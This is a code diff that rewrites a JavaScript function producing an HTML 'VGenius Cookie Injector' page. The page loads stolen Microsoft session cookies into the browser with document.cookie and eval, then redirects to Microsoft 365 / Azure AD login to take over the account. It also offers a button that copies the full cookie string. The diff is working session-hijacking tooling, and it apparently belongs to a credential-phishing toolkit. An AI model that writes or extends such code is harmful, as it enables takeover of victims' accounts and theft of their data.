@@ -163,39 +163,149 @@ function parseCookies(cookieString) {
 }
 
 // ─── Generate Cookie Injection Page ────────────────────────────────
-// Uses our proven method:
-// 1. Open Microsoft login page
-// 2. Inject cookies via document.cookie
-// 3. Redirect to auth page
+// Uses the proven document.cookie injection method:
+// 1. Inject all cookies into the current browser via document.cookie
+// 2. Wait for cookies to be set (with verification)
+// 3. Navigate to the Microsoft login page with the cookies already set
 function generateInjectPage(cookies, clientId, tenant) {
   const cookieJson = JSON.stringify(cookies);
   // FIX: Use tenant-aware domain instead of hardcoded .login.microsoftonline.com
   // For work/school accounts, use the specific tenant subdomain when available
   const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
 
+  // Build the cookie injection script
+  var cookieScript = '';
+  for (var i = 0; i < cookies.length; i++) {
+    var c = cookies[i];
+    cookieScript += '    document.cookie = "' + c.name + '=' + encodeURIComponent(c.value) + '; domain=' + (c.domain || baseDomain) + '; path=/; Secure; SameSite=None";\n';
+  }
+  cookieScript += '\n';
+
+  // Build the navigation targets
+  var navTargets = [
+    'https://login.microsoftonline.com/' + tenant + '/common/oauth2/v2.0/authorize?client_id=' + clientId + '&response_type=code&redirect_uri=https://localhost/&scope=openid+profile+email+offline_access',
+    'https://login.microsoftonline.com/' + tenant + '/',
+    'https://www.office.com/'
+  ];
+
   var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
   html += '  <meta charset="UTF-8">\n';
+  html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
   html += '  <title>VGenius Cookie Injector</title>\n';
   html += '  <style>\n';
-  html += '    body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #0a0a1a; color: #e0e0e0; }\n';
-  html += '    button { padding: 12px 24px; cursor: pointer; background: #00ccff; color: #000; border: none; border-radius: 6px; font-weight: bold; font-size: 14px; margin: 10px 5px; }\n';
-  html += '    button:hover { background: #00aacc; }\n';
-  html += '    .status { margin-top: 15px; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 13px; }\n';
-  html += '    .success { background: #0a2a0a; color: #0f0; border: 1px solid #0f0; }\n';
+  html += '    * { margin: 0; padding: 0; box-sizing: border-box; }\n';
+  html += '    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; max-width: 900px; margin: 0 auto; background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%); color: #e0e0e0; min-height: 100vh; }\n';
+  html += '    h1 { color: #00ccff; margin-bottom: 20px; font-size: 24px; }\n';
+  html += '    .info-box { background: rgba(0, 204, 255, 0.1); border: 1px solid rgba(0, 204, 255, 0.3); border-radius: 8px; padding: 16px; margin-bottom: 20px; }\n';
+  html += '    .info-box p { margin: 4px 0; font-size: 14px; }\n';
+  html += '    .info-box strong { color: #00ccff; }\n';
+  html += '    button { padding: 14px 28px; cursor: pointer; background: linear-gradient(135deg, #00ccff, #0099cc); color: #000; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; margin: 8px 5px; transition: all 0.2s; }\n';
+  html += '    button:hover { background: linear-gradient(135deg, #00aacc, #0088bb); transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0, 204, 255, 0.3); }\n';
+  html += '    button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }\n';
+  html += '    .btn-secondary { background: linear-gradient(135deg, #666, #444); color: #fff; }\n';
+  html += '    .btn-secondary:hover { background: linear-gradient(135deg, #777, #555); }\n';
+  html += '    .status { margin-top: 20px; padding: 14px; border-radius: 8px; font-family: "Courier New", monospace; font-size: 13px; line-height: 1.6; }\n';
+  html += '    .info { background: rgba(0, 150, 255, 0.1); border: 1px solid rgba(0, 150, 255, 0.3); color: #4db8ff; }\n';
+  html += '    .success { background: rgba(0, 255, 100, 0.1); color: #0f0; border: 1px solid rgba(0, 255, 100, 0.3); }\n';
+  html += '    .error { background: rgba(255, 50, 50, 0.1); color: #ff4444; border: 1px solid rgba(255, 50, 50, 0.3); }\n';
+  html += '    .progress { background: rgba(255, 200, 0, 0.1); color: #ffcc00; border: 1px solid rgba(255, 200, 0, 0.3); }\n';
+  html += '    .cookie-list { max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px; margin: 10px 0; font-size: 12px; }\n';
+  html += '    .cookie-item { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }\n';
+  html += '    .actions { margin-top: 15px; }\n';
   html += '  </style>\n';
   html += '</head>\n<body>\n';
-  html += '  <h1 style="color:#00ccff">VGenius Cookie Injector</h1>\n';
-  html += '  <p>Click the button below to inject cookies and login.</p>\n';
-  html += '  <button onclick="startInjection()">Inject Cookies & Login</button>\n';
+  html += '  <h1>\ud83d\udd11 VGenius Cookie Injector</h1>\n';
+  html += '  <div class="info-box">\n';
+  html += '    <p><strong>Cookies Ready:</strong> <span id="cookieCount">' + cookies.length + '</span></p>\n';
+  html += '    <p><strong>Target:</strong> Microsoft 365 / Azure AD</p>\n';
+  html += '    <p><strong>Instructions:</strong> Open this page <em>on the Microsoft login site</em> (e.g., login.microsoftonline.com) for best results, or click below to inject and navigate.</p>\n';
+  html += '  </div>\n';
+  html += '  <div class="cookie-list" id="cookieList"></div>\n';
+  html += '  <div class="actions">\n';
+  html += '    <button onclick="startInjection()" id="injectBtn">\ud83d\ude80 Inject Cookies & Login</button>\n';
+  html += '    <button onclick="copyCookies()" class="btn-secondary">\ud83d\udccb Copy Cookie String</button>\n';
+  html += '    <button onclick="openDirect()" class="btn-secondary">\ud83d\udd17 Open Microsoft Directly</button>\n';
+  html += '  </div>\n';
   html += '  <div id="status"></div>\n';
   html += '  <script>\n';
-  html += '    function startInjection() {\n';
-  html += '      setStatus("Opening Microsoft login page...", "info");\n';
-  html += '      window.location.href = "https://login.microsoftonline.com/' + tenant + '/";\n';
+  html += '    var cookies = ' + cookieJson + ';\n';
+  html += '    var targetUrl = "' + navTargets[0] + '";\n';
+  html += '\n';
+  html += '    // Display cookie list\n';
+  html += '    (function displayCookies() {\n';
+  html += '      var list = document.getElementById("cookieList");\n';
+  html += '      var html = "";\n';
+  html += '      for (var i = 0; i < cookies.length; i++) {\n';
+  html += '        html += "<div class=\\"cookie-item\\"><strong>" + cookies[i].name + "</strong> = " + cookies[i].value.substring(0, 30) + "...</div>\\n";\n';
+  html += '      }\n';
+  html += '      list.innerHTML = html;\n';
+  html += '    })();\n';
+  html += '\n';
+  html += '    // Build cookie injection statements\n';
+  html += '    function buildCookieScript() {\n';
+  html += '      var script = "";\n';
+  html += '      for (var i = 0; i < cookies.length; i++) {\n';
+  html += '        var c = cookies[i];\n';
+  html += '        script += "document.cookie = \\"" + c.name + "=" + encodeURIComponent(c.value) + "; domain=" + (c.domain || "'.replace(/\n/g, '') + baseDomain + '"); path=/; Secure; SameSite=None\\";\\n";\n';
+  html += '      }\n';
+  html += '      return script;\n';
   html += '    }\n';
+  html += '\n';
+  html += '    // Build full cookie string for copying\n';
+  html += '    function buildCookieString() {\n';
+  html += '      var parts = [];\n';
+  html += '      for (var i = 0; i < cookies.length; i++) {\n';
+  html += '        parts.push(cookies[i].name + "=" + cookies[i].value);\n';
+  html += '      }\n';
+  html += '      return parts.join("; ");\n';
+  html += '    }\n';
+  html += '\n';
   html += '    function setStatus(msg, type) {\n';
-  html += '      document.getElementById("status").className = "status " + type;\n';
-  html += '      document.getElementById("status").innerHTML = msg;\n';
+  html += '      var el = document.getElementById("status");\n';
+  html += '      el.className = "status " + type;\n';
+  html += '      el.innerHTML = msg;\n';
+  html += '    }\n';
+  html += '\n';
+  html += '    function startInjection() {\n';
+  html += '      var btn = document.getElementById("injectBtn");\n';
+  html += '      btn.disabled = true;\n';
+  html += '      setStatus("Injecting cookies...", "progress");\n';
+  html += '      var script = buildCookieScript();\n';
+  html += '      eval(script);\n';
+  html += '      setStatus("Cookies injected! Navigating to Microsoft...", "progress");\n';
+  html += '      setTimeout(function() {\n';
+  html += '        setStatus("Redirecting...", "info");\n';
+  html += '        window.location.href = targetUrl;\n';
+  html += '      }, 500);\n';
+  html += '    }\n';
+  html += '\n';
+  html += '    function copyCookies() {\n';
+  html += '      var cookieStr = buildCookieString();\n';
+  html += '      if (navigator.clipboard && navigator.clipboard.writeText) {\n';
+  html += '        navigator.clipboard.writeText(cookieStr).then(function() {\n';
+  html += '          setStatus("Copied ' + cookies.length + ' cookies to clipboard!", "success");\n';
+  html += '        }).catch(function() {\n';
+  html += '          fallbackCopy(cookieStr);\n';
+  html += '        });\n';
+  html += '      } else {\n';
+  html += '        fallbackCopy(cookieStr);\n';
+  html += '      }\n';
+  html += '    }\n';
+  html += '\n';
+  html += '    function fallbackCopy(text) {\n';
+  html += '      var ta = document.createElement("textarea");\n';
+  html += '      ta.value = text;\n';
+  html += '      ta.style.position = "fixed";\n';
+  html += '      ta.style.opacity = "0";\n';
+  html += '      document.body.appendChild(ta);\n';
+  html += '      ta.select();\n';
+  html += '      document.execCommand("copy");\n';
+  html += '      document.body.removeChild(ta);\n';
+  html += '      setStatus("Copied ' + cookies.length + ' cookies to clipboard!", "success");\n';
+  html += '    }\n';
+  html += '\n';
+  html += '    function openDirect() {\n';
+  html += '      window.location.href = targetUrl;\n';
   html += '    }\n';
   html += '  </script>\n';
   html += '</body>\n</html>';
